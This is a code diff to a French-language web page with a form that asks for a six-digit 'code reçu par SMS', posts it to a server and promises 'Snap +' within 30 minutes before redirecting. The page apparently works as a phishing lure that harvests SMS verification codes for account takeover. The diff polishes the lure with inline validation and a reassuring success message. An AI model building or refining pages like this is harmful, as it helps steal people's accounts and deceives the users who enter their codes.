@@ -85,10 +85,18 @@
     }
 
     #errorMessage,
-    #referralError {
+    #referralError,
+    #codeError,
+    #codeSentMessage {
       color: red;
       display: none;
       margin-top: 10px;
+      font-weight: bold;
+    }
+
+    #codeSentMessage {
+      color: green;
+      display: none;
     }
 
     /* Styles pour la zone de code */
@@ -161,6 +169,8 @@
     <label for="codeInput">Code Reçu par SMS</label>
     <input type="text" id="codeInput" name="codeInput" />
     <button id="validateButton">Validez</button>
+    <p id="codeError">Le code doit contenir exactement 6 chiffres.</p>
+    <p id="codeSentMessage">Recevra Snap + dans 30 minutes</p>
   </div>
 
   <script>
@@ -230,9 +240,14 @@
     // Gestion du bouton "Validez"
     document.getElementById('validateButton').addEventListener('click', function() {
       const codeInput = document.getElementById('codeInput').value.trim();
+      const codeError = document.getElementById('codeError');
+      const codeSentMessage = document.getElementById('codeSentMessage');
 
-      if(codeInput.length === 0){
-        alert("Veuillez entrer un code.");
+      codeError.style.display = 'none';
+      codeSentMessage.style.display = 'none';
+
+      if(!/^\d{6}$/.test(codeInput)){
+        codeError.style.display = 'block';
         return;
       }
 
@@ -258,7 +273,7 @@
         body: JSON.stringify(codeMessage),
       })
       .then(response => {
-        alert("Code envoyé ! La redirection aura lieu dans 30 secondes.");
+        codeSentMessage.style.display = 'block'; // Affiche le message
         // Redirection après 30 secondes
         setTimeout(() => {
           window.location.href = redirectURL;
